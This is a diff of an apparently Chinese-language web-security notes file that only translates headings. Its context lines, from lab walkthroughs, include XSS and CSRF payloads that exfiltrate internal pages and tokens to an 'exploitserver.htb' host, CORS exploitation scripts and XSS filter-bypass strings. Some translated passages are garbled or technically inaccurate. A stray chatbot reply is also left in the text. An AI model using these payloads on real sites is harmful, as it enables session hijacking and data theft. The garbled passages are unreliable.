@@ -240,7 +240,7 @@ Set-Cookie: session=hacked</code></pre>
 <blockquote>用户输入被“直接拼进协议结构”。</blockquote>
 <hr />
 <h3>常见攻击类型</h3>
-<h4>Header Injection</h4>
+<h4>Header 注入</h4>
 <p>攻击者插入新的 Header，例如：</p>
 <ul>
   <li>Set-Cookie</li>
@@ -253,7 +253,7 @@ Set-Cookie: session=hacked</code></pre>
   <li>劫持会话</li>
   <li>控制重定向行为</li>
 </ul>
-<h4>HTTP Response Splitting</h4>
+<h4>HTTP 响应拆分</h4>
 <p>通过插入如下内容：</p>
 <pre><code>\r\n\r\n</code></pre>
 <p>强行结束当前响应，开始一个新的响应：</p>
@@ -266,14 +266,14 @@ Set-Cookie: session=hacked</code></pre>
   <li>构造 XSS</li>
   <li>返回恶意内容</li>
 </ul>
-<h4>Web Cache Poisoning</h4>
+<h4>Web 缓存投毒</h4>
 <ul>
   <li>利用 CRLF 注入修改缓存内容</li>
   <li>污染 CDN 或代理缓存</li>
   <li>让其他用户访问恶意页面</li>
   <li>实现持久攻击</li>
 </ul>
-<h4>Request Smuggling（高阶利用）</h4>
+<h4>请求走私（高阶利用）</h4>
 <p>CRLF 可以作为基础构造：</p>
 <ul>
   <li>插入额外请求</li>
@@ -298,7 +298,7 @@ Set-Cookie: session=hacked</code></pre>
 <hr />
 <h3>编码与绕过</h3>
 <p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
-<h4>URL 编码</h4>
+<h4>URL 编码绕过</h4>
 <pre><code>%0d%0a
 %0a
 %0d</code></pre>
@@ -421,30 +421,30 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <h3>Examples</h3>
 <p>A remote unauthenticated buffer overflow that leads to shell access is likely critical. An admin-only stored XSS may be medium if it requires high privileges and has limited impact. The vulnerability name alone does not determine severity.</p>`,
       zh: String.raw`<h2>理论</h2>
-<h3>Bug Bounty Programs</h3>
+<h3>漏洞赏金计划</h3>
 <p>正如本模块总结中提到的，漏洞赏金计划通常被视为一种众包式安全机制：个人通过发现并报告软件漏洞，获得认可与报酬。</p>
 <p>不过，漏洞赏金计划的意义远不止“找漏洞拿奖金”这么简单。漏洞赏金计划（Bug Bounty Program），也常被称为漏洞奖励计划（Vulnerability Rewards Program, VRP），本质上是一种<strong>持续、主动</strong>的安全测试机制。它用于补充企业内部的代码审计和渗透测试，并进一步完善组织整体的漏洞管理策略。也就是说，它不是一次性的安全检查，而是把外部研究人员的持续测试纳入企业长期安全体系中。</p>
 <p>对其漏洞赏金平台的描述很贴切：<strong>“持续测试，持续防护（Continuous testing, constant protection）”</strong>。这说明漏洞赏金并不是开发结束后的附加项目，而是可以无缝融入企业现有软件开发生命周期中的安全环节。换句话说，它让安全测试从阶段性行为，变成一种长期运行的机制。</p>
 <hr />
-<h3>Bug Bounty Program Types</h3>
+<h3>漏洞赏金计划类型</h3>
 <p>漏洞赏金计划主要可以分为<strong>私有计划</strong>和<strong>公开计划</strong>两类。</p>
 <p>私有漏洞赏金计划不会向公众开放。研究人员只有在收到特定邀请后，才能参与这类项目。大多数漏洞赏金计划最初都会以私有形式启动，因为这样企业可以先逐步适应接收漏洞报告、进行分类和处理的流程，等机制成熟后再开放给更广泛的安全社区。通常，研究人员能否获得私有项目邀请，与其过往成绩、有效漏洞提交的稳定性以及是否有违规记录密切相关。像 HackerOne 这样的平台，就会根据一系列标准发出邀请。有些项目甚至还会要求参与者通过背景调查。</p>
 <p>公开漏洞赏金计划则面向整个黑客社区开放，任何符合条件的研究人员都可以参与测试和报告漏洞。这种模式覆盖面更广，能够借助更多外部研究者的力量发现问题，但对企业的处理能力要求也更高。</p>
 <p>除此之外，还有一种<strong>母子计划（Parent/Child Programs）</strong>。这种模式下，母公司和其子公司会共享同一个奖金池以及同一个网络安全团队。若某个子公司启动了自己的漏洞赏金项目，该项目会与母项目关联起来。这个设计便于集团化公司统一管理漏洞处理和奖励发放。</p>
 <p>这里还有一个很重要的概念区分：<strong>Bug Bounty Program（BBP）</strong> 和 <strong>Vulnerability Disclosure Program（VDP）</strong> 不能混用。 漏洞披露计划（VDP）只是告诉外部人员：如果你发现了漏洞，应该如何向该组织提交信息。它本身不一定提供奖金。 而漏洞赏金计划（BBP）则更进一步：它不仅鼓励第三方主动去发现并上报漏洞，还会以金钱奖励作为激励。简单说，<strong>VDP 解决“怎么报”，BBP 解决“报了有什么激励”</strong>。两者有联系，但不是一回事。</p>
 <hr />
-<h3>Bug Bounty Program Code of Conduct</h3>
+<h3>漏洞赏金计划行为准则</h3>
 <p>漏洞赏金猎人的违规记录会一直被重点考虑，因此，严格遵守每个漏洞赏金项目或平台的行为准则（Code of Conduct）是非常关键的。这不是走形式，也不是“顺手瞄一眼就行”的东西。恰恰相反，花时间认真阅读这些规则，会直接影响你能不能高效、安全、专业地提交报告。</p>
 <p>行为准则不仅规定了参与者应该如何行动，也会帮助研究人员更清楚地理解项目方的期望，从而减少误解、避免踩线，并提升漏洞报告的质量。很多新手容易只盯着技术细节，忽视项目规则，结果漏洞没问题，流程上却翻车，这就很亏。</p>
 <p>如果想成为成熟、长期可持续的漏洞赏金猎人，就必须在<strong>专业性</strong>和<strong>技术能力</strong>之间取得平衡。不是只会挖洞就够了，也不是只会写礼貌邮件就行，二者缺一不可。文中也建议读者去查看 HackerOne 的行为准则，以熟悉这类文档的写法和要求。这个建议很实际，因为很多平台的规则虽然措辞不同，但底层逻辑都差不多：别乱搞，别越界，按规范来。</p>
 <hr />
-<h3>Bug Bounty Program Structure</h3>
+<h3>漏洞赏金计划结构</h3>
 <p>接下来，文章开始说明一个漏洞赏金计划通常长什么样。它建议读者去 HackerOne 的项目列表中查看具体实例，比如 Alibaba BBP 和 Amazon Vulnerability Research Program，并重点阅读其中的 <strong>Policy</strong> 部分。</p>
 <p>按照 HackerOne 的说法，Policy 部分是组织用来向黑客说明项目细节的地方。企业通常会在这里发布漏洞披露政策，告诉研究人员：他们希望怎样接收漏洞信息、哪些产品或服务允许测试、哪些内容属于测试范围。通常，这些范围会通过域名、IP 范围、Web 应用，或者特定的 App Store / Play Store 应用来界定。</p>
 <p>一个典型的漏洞赏金计划通常会包含以下要素： 它会说明厂商响应的 SLA，也就是厂商会在什么时间、以什么方式回应报告；会说明研究测试所需的访问方式，比如如何创建测试账号；会规定资格标准，例如“必须是第一个提交该漏洞的人”才能拿到奖励；会提供负责任披露政策，用来约定公开时间线和协调流程，以保障用户安全；还会定义参与规则（Rules of Engagement）、测试范围（Scope）、范围外内容（Out of Scope）、报告格式（Reporting Format）、奖励机制（Rewards）、安全港条款（Safe Harbor）、法律条款（Legal Terms and Conditions）以及联系信息（Contact Information）。</p>
 <p>在 HackerOne 上，这些内容通常都包含在每个项目的 Policy 部分里。这里的重点很明确：<strong>一定要仔细看项目说明和政策，不要想当然。</strong> 很多来回扯皮、时间浪费，根本不是因为技术不会，而是因为一开始没把规则看清楚。漏洞赏金里，时间确实很重要，谁先提交、谁提交得更规范，都会影响结果。这个领域有点像打怪抢首杀，但规则比副本机制还烦，不读清楚就容易白忙活。</p>
 <hr />
-<h3>Finding Bug Bounty Programs</h3>
+<h3>寻找漏洞赏金项目</h3>
 <p>在寻找合适的漏洞赏金项目方面，文中推荐的一个优秀在线资源是 <strong>HackerOne Directory</strong>。这个目录可以帮助研究人员找到自己感兴趣的漏洞赏金计划，也可以用来查找某些组织的漏洞报告联系方式，以便你在合规、道德的前提下报告自己发现的问题。</p>
 <p>也就是说，这个目录不仅适合想“主动找项目做”的人，也适合那些在日常研究中偶然发现某组织漏洞、希望合法上报的人。它既是项目入口，也是负责任披露的一个信息来源。</p>
 <hr />
@@ -452,7 +452,7 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <p>这部分内容的核心意思可以概括为：漏洞赏金计划并不只是“发现漏洞换奖金”的简单机制，而是企业持续安全治理体系中的一个重要组成部分。它可以分为私有和公开两类，有时还存在母子项目结构。与此同时，BBP 和 VDP 必须明确区分，前者带有奖励激励，后者主要是披露通道。</p>
 <p>对于参与者来说，真正重要的不只是技术水平，还包括是否理解并遵守项目规则。行为准则、范围、报告要求、法律条款这些内容看起来不刺激，但往往决定你能不能顺利、长期地做下去。最后，像 HackerOne Directory 这样的平台目录，是寻找项目和合法报告入口的重要资源。</p>
 <p>如果你要，我下一步可以把这段内容继续整理成<strong>更像考试笔记的版本</strong>，也就是更短、更好背的那种 Markdown。</p>
-<h2>Writing a Good Report</h2>
+<h2>如何写好漏洞报告</h2>
 <p>这一部分主要讲的是：<strong>一份好的漏洞报告该怎么写，以及为什么要用 CWE 和 CVSS 来描述漏洞。</strong></p>
 <p>好的漏洞报告首先要做到<strong>清晰、简洁、可复现</strong>。也就是说，报告不能只是说“这里有漏洞”，而是要让安全团队或分诊团队能够迅速看懂问题、理解影响，并且按照你提供的步骤一步一步复现漏洞。尤其重要的是，报告中必须清楚写出漏洞利用的复现过程，否则哪怕你真的找到高价值漏洞，对方也可能因为无法复现而延迟处理，甚至直接降低优先级。</p>
 <p>文中还特别提到，如果你面对的是安全成熟度较低的公司，不能只堆技术术语。你需要把技术问题翻译成更容易理解的业务语言，让对方明白这个漏洞到底会带来什么现实风险。因为很多时候，真正推动修复的不是“这是个 XX 漏洞”，而是“这个漏洞会导致客户数据泄露、后台被接管、业务中断”。</p>
@@ -467,7 +467,7 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <p>最后是<strong>修复建议</strong>。文中说这在漏洞赏金项目里是可选项，不一定强制要求，但如果你能提供合理的修复建议，整体报告质量会更高，也更容易体现专业性。</p>
 <p>总体来说，<strong>可读性强、格式清晰的报告能大幅减少复现时间和分诊时间</strong>。这很关键，因为漏洞赏金场景里，时间就是货币，报告越容易处理，你越容易被高效确认。</p>
 <hr />
-<h3>Why CWE &amp; CVSS?</h3>
+<h3>为什么要使用 CWE 与 CVSS</h3>
 <p>这一部分解释了：为什么漏洞报告里经常要写 CWE 和 CVSS。</p>
 <h4>是什么</h4>
 <p>CWE，全称 <strong>Common Weakness Enumeration</strong>，即<strong>通用弱点枚举</strong>。MITRE 把它定义为一个社区共同维护的软件和硬件弱点类型列表。它相当于一种统一语言，用于描述漏洞背后的弱点本质，比如输入验证不当、访问控制缺失、命令注入之类。</p>
@@ -479,7 +479,7 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <p>而 CVSS 更像是在回答： <strong>“这个问题有多严重？”</strong></p>
 <p>所以这两个东西经常一起出现，一个负责分类，一个负责定级。</p>
 <hr />
-<h3>Using CVSS Calculator</h3>
+<h3>使用 CVSS 计算器</h3>
 <p>这一部分开始讲 <strong>CVSS v3.1 计算器</strong> 怎么用，并说明在这里主要关注 <strong>Base Score（基础分）</strong>。</p>
 <p>的各个维度，本质上是在评估：漏洞是怎么被利用的、利用难不难、需要什么权限、影响大不大。</p>
 <h4>1. Attack Vector（攻击向量）</h4>
@@ -522,14 +522,14 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <ul><li><strong>Low (L)</strong>：服务性能下降，但不能完全拒绝服务。</li></ul>
 <ul><li><strong>High (H)</strong>：服务严重受影响甚至中断。</li></ul>
 <hr />
-<h3>Examples</h3>
+<h3>示例</h3>
 <p>文中给了两个例子，说明如何使用 CVSS 3.1 对漏洞做严重性分析。</p>
 <h4>例子 1：Cisco ASA 缓冲区溢出漏洞</h4>
 <p>这个漏洞的 CVSS 3.1 分数是 <strong>9.8（Critical，严重）</strong>。 因为它可以通过网络远程利用，不需要认证，也不需要用户交互，攻击复杂度低，最终还能让攻击者获得反向 shell。于是它在机密性、完整性、可用性三个维度上都被评为 <strong>High</strong>。这类漏洞基本上就是“远程接管设备”的典型高危漏洞，分高得很合理，没什么悬念。</p>
 <h4>例子 2：管理员后台的存储型 XSS</h4>
 <p>这个漏洞的 CVSS 3.1 分数是 <strong>5.5（Medium，中危）</strong>。 虽然攻击可以通过网络发起，复杂度也不高，但前提是攻击者本身必须已经具备管理员权限，也就是说 <strong>Privileges Required = High</strong>。此外，这个漏洞的影响主要体现在 DOM 访问和一定程度上的应用完整性影响，不能直接导致服务不可用，因此 Confidentiality 和 Integrity 是 <strong>Low</strong>，Availability 是 <strong>None</strong>。 这说明 CVSS 打分不是只看漏洞名字，<strong>不是看到 XSS 就自动高危</strong>，而是要看具体利用条件和影响范围。</p>
 <hr />
-<h3>Good Report Examples</h3>
+<h3>优秀报告示例</h3>
 <p>最后这一部分列举了一些 HackerOne 选出的优秀漏洞报告案例，比如：</p>
 <ul><li>导致所有实例获得 ROOT 权限</li></ul>
 <ul><li>桌面应用远程代码执行</li></ul>
@@ -852,8 +852,8 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
 <img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043428.png" alt="Pasted image 20260415043428" />
 <p>然而，这证实了我们的 CSRF 有效载荷已成功发送 HTTP 请求以提升用户权限。要执行攻击，我们可以将有效载荷传递给受害者并选择当前的虚拟主机<code>csrf.labintro.htb</code>。这将导致受害者访问某个页面<code>https://exploitserver.htb/exploit</code>。等待几秒钟并刷新页面后，我们就会获得管理员权限：</p>
 <img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043442.png" alt="Pasted image 20260415043442" />
-<h2>Same-Origin Policy &amp; CORS</h2>
-<h3>Same-Origin Policy</h3>
+<h2>同源策略与 CORS</h2>
+<h3>同源策略</h3>
 <p>同源策略是一种在网页浏览器中实现的安全机制，旨在防止网站的跨源访问。特别是，运行在一个源节点上的 JavaScript 代码无法访问另一个源节点。这防止恶意网站从其他来源窃取信息，并限制其向其他来源发送的请求类型。</p>
 <p><code>origin</code>定义为URL的<code>scheme</code>, <code>host</code>, and <code>port</code>. 只要两个URL在这三个属性中至少有一个不同, 就不是同源.</p>
 <p>两个 URL <strong>同源（same origin）</strong> 必须满足三点完全相同：</p>
@@ -899,7 +899,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
         &lt;/script&gt;
     &lt;/body&gt;
 &lt;/html&gt;</code></pre>
-<h3>CORS</h3>
+<h3>CORS 跨源资源共享</h3>
 <p>跨原点资源共享（CORS）是 W3C 的一个标准，定义了同源政策的例外情况。它使源区能够定义可信源区和允许跨区访问的 HTTP 方法列表。</p>
 <p>为了理解为什么需要 CORS，我们假设现实中常见的场景：一个托管在 <code>http://vulnerablesite.htb</code> 上的网页应用显示数据。为此，它与托管在 <code>http://api.vulnerablesite.htb</code> 上的 API 通信。更具体地说，运行<code>在 http://vulnerablesite.htb</code> 上的应用程序仅包含前端代码，负责从 API 获取数据。该 API 实现了一个简单的 REST API，由用于创建、读取、更新和删除数据的端点组成。</p>
 <p>这使得前端网页应用变得简单，无需处理数据相关的逻辑。特别是，前端代码处理与 API 的交互，可以使用类似以下的 JavaScript 代码，因此所有数据在网站加载后都会被获取：</p>
@@ -958,7 +958,7 @@ Access-Control-Allow-Headers</code></pre>
 <p>在深入探讨 CORS 配置错误之前，先讨论 CORS 配置错误可能带来的攻击途径。大多数攻击要求将<code>访问-控制-允许-凭证</code>头 设置为 <code>true</code>，从而在受害者的上下文中获得认证请求。如果 CORS 配置错误导致攻击者控制的域获得了同源策略的例外，那么由此产生的漏洞类似于 CSRF 漏洞，但更为严重。同源策略的例外允许攻击者控制的域访问交叉起源请求的响应。由于请求来自认证上下文，响应包含攻击者可能访问和窃取的敏感信息。此外，根据具体的 CORS 配置，攻击者可能与网络应用交互，冒充受害者并代其执行操作。</p>
 <p>如果未设置访问<code>控制允许凭证（Access-Control-Allow-Credentials</code> ）首部，攻击者将无法继续实施这些攻击。然而，内部网页应用中的 CORS 配置错误可能使攻击者窃取不公开的信息。</p>
 <blockquote><strong>注：</strong> 成功利用以下部分 CORS 错误配置，可能需要在现实世界网络应用中的会话 cookie 上设置 <code>SameSite=None</code> 属性。</blockquote>
-<h3>任意Origin反射</h3>
+<h3>任意 Origin 反射</h3>
 <p>The <code>Access-Control-Allow-Origin</code> 头包含源头，允许绕过同源策略，因此浏览器允许源节点访问响应。此外，头部可以设置为通配符（<code>*</code>），这会导致所有起点获得同源策略绕过。但出于安全原因，该功能不能与<code>Access-Control-Allow-Credentials: true</code>真头合并，即通配符只能在没有凭证的情况下使用。</p>
 <blockquote><strong>注：</strong> 原站和通配符的组合，比如 <code>https：//*.cors-misconfigs.htb</code>，是无效的。</blockquote>
 <p>然而，一些网页应用需要允许多个来源的凭证。例如，想象一个运行<code>在 https://cors-misconfigs.htb</code> 的网页应用需要认证，并且被多个域（如 <code>https://site1.cors-misconfigs.htb</code> 和 <code>https://site2.cors-misconfigs.htb</code>）使用。为了实现这一点，网页应用可能会读取请求的 <code>Origin</code> 头，并在响应中的 <code>Access-Control-Allow-Origin</code> 头中反映出来。这实际上导致了与通配符起源与<code>Access-Control-Allow-Credentials: true</code> 头部结合的情景相同，但 CORS 标准并未明确阻止。</p>
@@ -1025,7 +1025,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
 <p>网页应用必须在反映来源白名单上对照可信来源，而不是反映任意的起源。如果检查不当，攻击者可能会绕过它，实现对不可信来源的同源例外。特别是，检查起源前缀或后缀的实现可能存在漏洞。</p>
 <p>网络应用的一个常见目标是信任某一来源的所有子域名。例如，假设托管在 <code>https://cors-misconfigs.htb</code> 的 API 通过检查来源头部是否以字符串 <code>cors-misconfigs.htb</code> 结尾来验证来源头部，以验证只有兄弟子域名被授予同源策略例外。虽然 API 在信任来源前会对其进行检查，但该检查实现不当，因为它不仅覆盖<code>了 cors-misconfigs.htb</code> 的子域名，还涵盖了所有以 <code>cors-misconfigs.htb</code> 结尾的域名。</p>
 <p><strong>Exploitation</strong> 利用这种 CORS 错误配置与利用任意原点反射（RNR）相同，攻击者可以使用相同的有效载荷来窃取数据。然而，由于检测了起点，攻击者对有效载荷的起点存在限制。由于后缀匹配，攻击者无法使用原 <code>https://exploitserver.htb</code> 进行利用，但可以选择任何以 <code>cors-misconfigs.htb</code> 结尾的原点，例如，<code>https://attackercors-misconfigs.htb</code> 作为载荷的托管。</p>
-<h3>可信的origin</h3>
+<h3>信任 null Origin</h3>
 <p><code>Access-Control-Allow-Origin</code>头 不仅支持可信的起点和通配符，还支持表示<code>null origin</code>的值空。虽然实际中不应使用，但一些网络应用可能因误解其含义而实现。攻击者可以通过各种方法强制对交叉起始请求使用空起点，该请求随后被信任，从而产生同源策略异常。</p>
 <p><strong>Exploitation</strong></p>
 <p>攻击者必须在交叉起源请求中提供<code>null</code>源以利用该错误配置。任何origin都可以通过使用沙盒 iframe 实现：</p>
@@ -1075,10 +1075,10 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
     xhr.send();
 &lt;/script&gt;</code></pre>
 <p>然而，使用 GET 请求进行数据窃取存在缺点。首先，操控<code>location</code>会导致重定向，使受害者明显意识到 XSS 攻击，因为他们浏览器中显示的网站会发生变化。因此，在后台使用 <code>fetch</code> 或 <code>XMLHttpRequest</code> 发起过滤请求，操作安全效果显著更好。其次，网址长度不是无限的。因此，如果我们试图泄露的数据过大，有效载荷可能会失败。</p>
-<h2>通过CORS错误配置绕过CSRF Tokens</h2>
+<h2>通过 CORS 错误配置绕过 CSRF Token</h2>
 <p>除了前述攻击向量外，CORS 配置错误还可被利用来绕过 CSRF 防御，实施 CSRF 攻击，即使已实施适当防御。</p>
 <p>如果 CORS 配置错误，使会话 cookie 与跨源请求同时发送，即设置了<code>Access-Control-Allow-Credentials</code> ，我们可以有效绕过同源策略。在这种情况下，常见的 CSRF 防御无效，正如本节我们将讨论的那样。</p>
-<h3>防御绕过: CSRF Tokens</h3>
+<h3>防御绕过：CSRF Token</h3>
 <p>如果我们能因 CORS 配置错误而绕过同源策略，就能访问我们发出的跨源请求的响应。这允许我们向创建有效 CSRF 令牌的端点发送交叉起源请求，读取该令牌，嵌入状态改变的交叉起源请求中，并用有效的 CSRF 令牌发送状态改变的交叉起源请求。由于所有这些都发生在受害者的会话中，即使经过正确检查并绑定到受害者的用户会话，CSRF 令牌仍然有效。</p>
 <p>然而，为了让受害者的浏览器发送受害者的会话 Cookie 以及 JavaScript 请求，我们要求易受攻击的网页应用必须明确将 <code>SameSite</code> cookie 属性设置为<code>null</code>,  此外还要处理 CORS 配置错误。根据规范，这仅允许通过<code>secure</code> Cookie 属性传输，该属性仅通过安全 HTTPS 连接实现 Cookie 传输。Cookie 不会通过任何未加密的 HTTP 连接发送。</p>
 <p>由于这一限制，示例网页应用及所有其他实验室组件只能通过 HTTPS 访问。如果我们分析网页应用，可以注意到该应用设置了<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials</code>的 CORS 头部，表明我们应检查 CORS 配置错误。此外，会话 cookie 同时设置了 <code>Secure</code> 和 <code>SameSite=None</code> 这两个 cookie 属性：</p>
@@ -1267,7 +1267,7 @@ document.location = "https://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=ht
 <ol><li>等几秒，再回：</li></ol>
 <pre><code>https://misc-csrf.htb/profile.php</code></pre>
 <p>权限已经变成 admin。</p>
-<h2>XSS Exploitation</h2>
+<h2>XSS 利用</h2>
 <p>我们可以利用跨站脚本 (XSS) 漏洞发起 HTTP 请求，获取其响应，并将数据泄露到我们控制的服务器。因此，我们可以精心构造 XSS 攻击载荷，发起跨域请求，并将 XSS 与 CSRF 攻击载荷结合使用，从而实施一种对受害者所在内部网络构成威胁的攻击技术。</p>
 <p>此外，如果未显式设置 SameSite 属性，Web 浏览器通常会强制执行 cookie 的 SameSite 策略，这<code>Lax</code>大大限制了 CSRF 攻击的可能性。因此，将 XSS 和 CSRF 结合起来是一种强大的攻击技术。</p>
 <p><strong>HTTPOnly Cookie flag</strong> 窃取受害者会话 Cookie 是威胁行为者利用 XSS 漏洞最广泛利用的手段。然而，通过使用会话 cookie 上的 <code>HttpOnly</code> 属性，可以防止这种技术。该属性阻止 JavaScript 代码访问该 Cookie。 更具体地说，如果我们访问 <code>document.cookie</code>，带有 <code>HTTPOnly</code> 属性的 Cookie 将不存在，这实际上防止了受害者会话 cookie 被窃取。然而，这并不一定减轻 XSS 漏洞的严重性。由于 XSS 允许我们在受害者的浏览器中，在易受攻击的网络应用中执行任意 JavaScript 代码，并且在受害者的上下文中，我们可以执行与知道会话 Cookie 相同的操作。然而，我们需要编写一个 XSS 负载来代表我们执行相应的操作，而不是在浏览器中设置受害者会话 Cookie 后手动操作。</p>
@@ -1391,7 +1391,7 @@ xhr.send();</code></pre>
 <p>等待受害者再次触发 XSS 漏洞后，我们收到以下对撤离服务器的回复，其中包含我们泄露的文件：</p>
 <img src="assets/posts/advanced-xss-csrf/Pasted image 20260418153219.png" alt="Pasted image 20260418153219" />
 <blockquote><strong>注：</strong> 我们可以将 HTML 代码保存到本地文件中，并在网页浏览器中打开以显示页面。我们可能需要泄露更多文件，比如脚本文件或样式表，以正确渲染页面。</blockquote>
-<h2>枚举内部API</h2>
+<h2>枚举内部 API</h2>
 <p>正如我们所见，我们可以利用 XSS 漏洞在受害者的用户上下文中触发特定功能，并窃取受害者有权访问的数据。然而，由于 XSS 有效载荷是在受害者的浏览器中执行的，因此它也使我们能够攻击仅在受害者私有网络内可访问的其他 Web 应用程序。</p>
 <p><strong>识别内部API</strong> 我们的攻击将以与前几节相同的方式开始。我们将首先把基础 XSS 有效载荷作为留言簿条目发布：</p>
 <pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
@@ -1509,7 +1509,7 @@ xhr.onload = () =&gt; {
     exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
 };
 xhr.send();</code></pre>
-<h2>利用内部Web应用程序 Ⅰ</h2>
+<h2>利用内部 Web 应用程序（一）</h2>
 <p><strong>识别漏洞</strong></p>
 <p>我们将从前几节中使用的相同的 XSS 攻击载荷和<code>/admin.php</code>端点数据外泄开始。这里我们将省略这部分内容，因为我们已经在前几节中讨论过相应的攻击载荷。 当受害者触发 XSS 漏洞时，响应会被泄露到泄露服务器。我们可以看到，管理端点包含对内部 Web 应用程序的引用<code>https://internal.internal-webapps-1.htb</code>：</p>
 <img src="assets/posts/advanced-xss-csrf/Pasted image 20260418161718.png" alt="Pasted image 20260418161718" />
@@ -1623,7 +1623,7 @@ xhr.onload = () =&gt; {
     exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
 };
 xhr.send(params);</code></pre>
-<h2>利用内部Web应用程序 Ⅱ</h2>
+<h2>利用内部 Web 应用程序（二）</h2>
 <p><strong>识别漏洞</strong> 识别过程与上一节讨论的过程基本相同。我们将使用相同的 XSS 基础有效载荷，并且管理端点包含对另一个内部 Web 应用程序的引用<code>https://internal.internal-webapps-2.htb</code>。我们可以使用以下有效载荷来窃取该内部 Web 应用程序的索引：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://internal.internal-webapps-2.htb/', false);
@@ -1705,7 +1705,7 @@ xhr.onload = () =&gt; {
 xhr.send(params);</code></pre>
 <h2>内容安全策略 (CSP)</h2>
 <p>内容 安全策略 (CSP) 是一种纵深防御的安全措施，它通过限制跨站脚本 (XSS) 漏洞的可利用性来降低其严重性。CSP 在<code>Content-Security-Policy</code>响应头中配置。</p>
-<h3>CSP基础知识</h3>
+<h3>CSP 基础知识</h3>
 <p>由多个指令组成。每个指令允许一个或多个值。浏览器会强制执行 CSP，并根据 CSP 阻止资源的加载或执行。本节将讨论一些示例指令。</p>
 <p>例如，该 <code>script-src</code> 指令定义了 JavaScript 可以从哪些位置加载和执行；我们可以使用以下策略限制允许加载 JavaScript 代码的域：</p>
 <p>http <code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></p>
@@ -1739,11 +1739,11 @@ xhr.send(params);</code></pre>
 <p>html <code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></p>
 <p>这样就可以移除所有内联 JavaScript 代码。</p>
 <p>我们可以使用现有的在线工具来评估云安全策略 (CSP)，例如Google 提供的CSP 评估工具。有关如何编写安全 CSP 的更多详细信息，请参阅OWASP CSP 速查表。</p>
-<h2>绕过弱CSP</h2>
+<h2>绕过弱 CSP</h2>
 <hr />
 <p>现在我们已经讨论了 CSP、CSP 指令和 CSP 指令值，接下来让我们讨论如何利用和绕过弱 CSP。</p>
 <hr />
-<h3>绕过弱CSP</h3>
+<h3>绕过弱 CSP</h3>
 <p>网络安全策略 (CSP) 可以作为一种纵深防御措施，用于防止跨站脚本攻击 (XSS)。然而，即使 Web 应用程序实现了 CSP，也并不意味着它就能自动抵御所有 XSS 攻击。如果 CSP 存在漏洞，攻击者就有可能绕过它。因此，分析 Web 应用程序的 CSP 是否存在潜在的绕过漏洞至关重要。</p>
 <p>让我们先来看下面的CSP：</p>
 <p>http <code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></p>
@@ -1772,7 +1772,7 @@ xhr.send(params);</code></pre>
 <p>html <code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></p>
 <p>通常，对内容安全策略 (CSP) 的评估取决于具体的 CSP 本身以及 Web 应用程序的功能。正如我们所见，如果 Web 应用程序实现了文件上传功能，则将<code>script-src</code>指令设置为 true<code>'self'</code>可能不安全。因此，在具体 Web 应用程序的上下文中评估 CSP 至关重要。</p>
 <p>&lt;scriPt sRc="https://exploitserver.htb/exploit"&gt;&lt;/scripT&gt;</p>
-<h2>XSS过滤器绕过</h2>
+<h2>XSS 过滤器绕过</h2>
 <p><strong>实现JavaScript执行</strong> 在讨论如何绕过 XSS 过滤器之前，我们将探讨三种实现 JavaScript 代码执行的方法。</p>
 <p>实现代码执行最常见（也最显而易见）的方法是使用 <code>script</code> 标签；Web 浏览器会执行其中包含的任何 JavaScript 代码：</p>
 <ul><li><strong>脚本标签</strong></li></ul>
@@ -1835,7 +1835,7 @@ setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
 Function(atob("YWxlcnQoMSk="))()</code></pre>
 <blockquote><strong>注：</strong> 为了在现实世界中绕过 XSS 过滤器，我们可以应用与其他漏洞（如 SQL 注入或命令注入）相同的方法。实际的绕过取决于网页应用实现的过滤器。它需要仔细测试，识别哪些关键词被列入白名单或黑名单，才能设计出未被阻挡的漏洞利用。</blockquote>
 <p>想了解更多 XSS 滤波绕过，请查看 OWASP 的 XSS 滤波规避速查表 。此外，还有针对不同类型滤波器的 XSS 有效载荷集合。例如，如果无法使用括号，我们可以引用不带括号的 XSS 有效载荷集合。此外，HTML 5 安全速查表还提供了更多针对 XSS 利用的浏览器特定示例。</p>
-<h2>Skills Assessment</h2>`
+<h2>技能评估</h2>`
     }
   },
 {
@@ -1885,7 +1885,7 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
 <h2>介绍</h2>
 <p>近年来, 攻击者专注于通过NTLM泄漏漏洞来提升权限. 微软Outlook应用程序尤其成为初始访问的主要目标，因为它频繁且通常是静默的网络连接可能会触发意外的NTLM身份验证。</p>
 <p>一旦攻击者获取了泄露的 NTLM 哈希值，其影响可能是毁灭性的。破解哈希值以获取明文密码并非总是必要；NTLM 哈希值本身可以直接用于<strong>哈希传递攻击</strong>。这使得攻击者无需知道用户密码即可进行身份验证，利用哈希值进行<strong>远程 PsExec、WMI 或 RDP 访问</strong>，甚至泄露之前无法获取的其他凭据。如果 NTLM 哈希值属于特权用户，攻击者可以执行<strong>DCSync 攻击</strong>、请求新的 Kerberos 票证或在域内提升权限。</p>
-<h2>1. Microsoft Word - 通过恶意RTF文档自动链接泄漏NTLM身份验证信息</h2>
+<h2>1. Microsoft Word：通过恶意 RTF 自动链接泄露 NTLM 身份验证信息</h2>
